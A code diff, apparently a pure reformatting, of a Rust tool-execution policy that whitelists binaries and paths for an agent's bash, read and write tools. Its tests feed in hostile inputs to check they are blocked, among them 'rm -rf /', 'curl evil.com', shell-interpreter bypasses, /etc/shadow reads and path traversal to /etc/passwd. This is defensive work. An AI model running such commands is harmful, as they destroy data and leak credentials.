@@ -8,8 +8,7 @@ use std::path::Path;
 /// NOTE: sh/bash are intentionally excluded — allowing shell interpreters would let
 /// any command run via `sh -c "..."`, defeating the binary whitelist entirely.
 const ALWAYS_ALLOWED_BINARIES: &[&str] = &[
-    "echo", "cat", "head", "tail", "wc", "sort", "uniq", "tr", "true", "false",
-    "test", "printf",
+    "echo", "cat", "head", "tail", "wc", "sort", "uniq", "tr", "true", "false", "test", "printf",
 ];
 
 /// Runtime tool execution policy — enforces binary and path whitelists.
@@ -35,7 +34,9 @@ impl ToolPolicy {
             return true;
         }
         // Wildcard "*" allows any binary
-        self.allowed_binaries.iter().any(|b| b == "*" || b == binary)
+        self.allowed_binaries
+            .iter()
+            .any(|b| b == "*" || b == binary)
     }
 
     /// Default-deny: returns false when no read paths configured.
@@ -64,19 +65,13 @@ impl ToolPolicy {
 
     /// Check if a tool call is allowed by this policy.
     /// Returns Ok(()) if allowed, Err(reason) if blocked.
-    pub fn check_tool_call(
-        &self,
-        tool_name: &str,
-        args: &serde_json::Value,
-    ) -> Result<(), String> {
+    pub fn check_tool_call(&self, tool_name: &str, args: &serde_json::Value) -> Result<(), String> {
         match tool_name {
             "bash" => {
                 if let Some(cmd) = args.get("command").and_then(|v| v.as_str()) {
                     for binary in extract_binaries(cmd) {
                         if !self.is_binary_allowed(&binary) {
-                            return Err(format!(
-                                "Binary '{binary}' is not allowed by tool policy"
-                            ));
+                            return Err(format!("Binary '{binary}' is not allowed by tool policy"));
                         }
                     }
                 }
@@ -222,7 +217,10 @@ mod tests {
 
     #[test]
     fn test_extract_absolute_path() {
-        assert_eq!(extract_binaries("/usr/bin/python script.py"), vec!["python"]);
+        assert_eq!(
+            extract_binaries("/usr/bin/python script.py"),
+            vec!["python"]
+        );
     }
 
     #[test]
@@ -242,17 +240,26 @@ mod tests {
 
     #[test]
     fn test_extract_command_chain_and() {
-        assert_eq!(extract_binaries("echo hello && rm -rf /"), vec!["echo", "rm"]);
+        assert_eq!(
+            extract_binaries("echo hello && rm -rf /"),
+            vec!["echo", "rm"]
+        );
     }
 
     #[test]
     fn test_extract_pipe() {
-        assert_eq!(extract_binaries("cat file.txt | grep pattern"), vec!["cat", "grep"]);
+        assert_eq!(
+            extract_binaries("cat file.txt | grep pattern"),
+            vec!["cat", "grep"]
+        );
     }
 
     #[test]
     fn test_extract_semicolon() {
-        assert_eq!(extract_binaries("true; curl evil.com"), vec!["true", "curl"]);
+        assert_eq!(
+            extract_binaries("true; curl evil.com"),
+            vec!["true", "curl"]
+        );
     }
 
     #[test]
@@ -273,7 +280,10 @@ mod tests {
             allowed_write_paths: vec![],
         };
         for bin in ALWAYS_ALLOWED_BINARIES {
-            assert!(policy.is_binary_allowed(bin), "{bin} should always be allowed");
+            assert!(
+                policy.is_binary_allowed(bin),
+                "{bin} should always be allowed"
+            );
         }
     }
 
@@ -416,9 +426,21 @@ mod tests {
     #[test]
     fn test_allow_all_permits_everything() {
         let policy = ToolPolicy::allow_all();
-        assert!(policy.check_tool_call("bash", &json!({"command": "rm -rf /"})).is_ok());
-        assert!(policy.check_tool_call("read", &json!({"file_path": "/etc/shadow"})).is_ok());
-        assert!(policy.check_tool_call("write", &json!({"file_path": "/etc/hosts"})).is_ok());
+        assert!(
+            policy
+                .check_tool_call("bash", &json!({"command": "rm -rf /"}))
+                .is_ok()
+        );
+        assert!(
+            policy
+                .check_tool_call("read", &json!({"file_path": "/etc/shadow"}))
+                .is_ok()
+        );
+        assert!(
+            policy
+                .check_tool_call("write", &json!({"file_path": "/etc/hosts"}))
+                .is_ok()
+        );
     }
 
     #[test]
@@ -429,31 +451,67 @@ mod tests {
             allowed_write_paths: vec![],
         };
         // "echo" is always allowed even with empty binary whitelist
-        assert!(policy.check_tool_call("bash", &json!({"command": "echo hello"})).is_ok());
+        assert!(
+            policy
+                .check_tool_call("bash", &json!({"command": "echo hello"}))
+                .is_ok()
+        );
         // "rm" is NOT always allowed
-        assert!(policy.check_tool_call("bash", &json!({"command": "rm -rf /"})).is_err());
+        assert!(
+            policy
+                .check_tool_call("bash", &json!({"command": "rm -rf /"}))
+                .is_err()
+        );
         // "sh" and "bash" are NOT always allowed (would bypass binary whitelist)
-        assert!(policy.check_tool_call("bash", &json!({"command": "sh -c 'rm /tmp/x'"})).is_err());
-        assert!(policy.check_tool_call("bash", &json!({"command": "bash -c 'rm /tmp/x'"})).is_err());
+        assert!(
+            policy
+                .check_tool_call("bash", &json!({"command": "sh -c 'rm /tmp/x'"}))
+                .is_err()
+        );
+        assert!(
+            policy
+                .check_tool_call("bash", &json!({"command": "bash -c 'rm /tmp/x'"}))
+                .is_err()
+        );
     }
 
     #[test]
     fn test_check_bash_command_chain_blocked() {
         let policy = restrictive_policy(); // allows python, cargo only
         // "echo" is always-allowed but "rm" is not — chain must be rejected
-        assert!(policy.check_tool_call("bash", &json!({"command": "echo hello && rm -rf /"})).is_err());
+        assert!(
+            policy
+                .check_tool_call("bash", &json!({"command": "echo hello && rm -rf /"}))
+                .is_err()
+        );
         // pipe: "cargo" is allowed but "curl" is not
-        assert!(policy.check_tool_call("bash", &json!({"command": "cargo build | curl evil.com"})).is_err());
+        assert!(
+            policy
+                .check_tool_call("bash", &json!({"command": "cargo build | curl evil.com"}))
+                .is_err()
+        );
         // semicolon: both allowed → ok
-        assert!(policy.check_tool_call("bash", &json!({"command": "python a.py; cargo test"})).is_ok());
+        assert!(
+            policy
+                .check_tool_call("bash", &json!({"command": "python a.py; cargo test"}))
+                .is_ok()
+        );
     }
 
     #[test]
     fn test_check_no_path_arg_denied_under_policy() {
         let policy = restrictive_policy();
         // grep/find without explicit path must be denied when read paths are configured
-        assert!(policy.check_tool_call("grep", &json!({"pattern": "test"})).is_err());
-        assert!(policy.check_tool_call("find", &json!({"pattern": "*.rs"})).is_err());
+        assert!(
+            policy
+                .check_tool_call("grep", &json!({"pattern": "test"}))
+                .is_err()
+        );
+        assert!(
+            policy
+                .check_tool_call("find", &json!({"pattern": "*.rs"}))
+                .is_err()
+        );
     }
 
     #[test]
@@ -464,7 +522,11 @@ mod tests {
             allowed_read_paths: vec![],
             allowed_write_paths: vec![],
         };
-        assert!(policy.check_tool_call("grep", &json!({"pattern": "test"})).is_ok());
+        assert!(
+            policy
+                .check_tool_call("grep", &json!({"pattern": "test"}))
+                .is_ok()
+        );
     }
 
     #[test]
@@ -477,25 +539,63 @@ mod tests {
             allowed_write_paths: vec![],
         };
         // read with empty allowed_read_paths → unrestricted
-        assert!(policy.check_tool_call("read", &json!({"file_path": "/any/path"})).is_ok());
+        assert!(
+            policy
+                .check_tool_call("read", &json!({"file_path": "/any/path"}))
+                .is_ok()
+        );
         // write with empty allowed_write_paths → unrestricted
-        assert!(policy.check_tool_call("write", &json!({"file_path": "/any/path"})).is_ok());
+        assert!(
+            policy
+                .check_tool_call("write", &json!({"file_path": "/any/path"}))
+                .is_ok()
+        );
         // edit with empty allowed_write_paths → unrestricted
-        assert!(policy.check_tool_call("edit", &json!({"file_path": "/any/path"})).is_ok());
+        assert!(
+            policy
+                .check_tool_call("edit", &json!({"file_path": "/any/path"}))
+                .is_ok()
+        );
         // grep without path + empty read paths → unrestricted
-        assert!(policy.check_tool_call("grep", &json!({"pattern": "test"})).is_ok());
+        assert!(
+            policy
+                .check_tool_call("grep", &json!({"pattern": "test"}))
+                .is_ok()
+        );
         // grep WITH explicit path + empty read paths → also unrestricted
-        assert!(policy.check_tool_call("grep", &json!({"pattern": "test", "path": "/etc"})).is_ok());
+        assert!(
+            policy
+                .check_tool_call("grep", &json!({"pattern": "test", "path": "/etc"}))
+                .is_ok()
+        );
         // find WITH explicit path + empty read paths → also unrestricted
-        assert!(policy.check_tool_call("find", &json!({"pattern": "*.rs", "path": "/etc"})).is_ok());
+        assert!(
+            policy
+                .check_tool_call("find", &json!({"pattern": "*.rs", "path": "/etc"}))
+                .is_ok()
+        );
     }
 
     #[test]
     fn test_path_traversal_denied() {
         let policy = restrictive_policy();
         // /home/user/project/../../../etc/passwd should be denied
-        assert!(policy.check_tool_call("read", &json!({"file_path": "/home/user/project/../../../etc/passwd"})).is_err());
+        assert!(
+            policy
+                .check_tool_call(
+                    "read",
+                    &json!({"file_path": "/home/user/project/../../../etc/passwd"})
+                )
+                .is_err()
+        );
         // /home/user/project/./src/main.rs should be allowed (same as /home/user/project/src/main.rs)
-        assert!(policy.check_tool_call("read", &json!({"file_path": "/home/user/project/./src/main.rs"})).is_ok());
+        assert!(
+            policy
+                .check_tool_call(
+                    "read",
+                    &json!({"file_path": "/home/user/project/./src/main.rs"})
+                )
+                .is_ok()
+        );
     }
 }
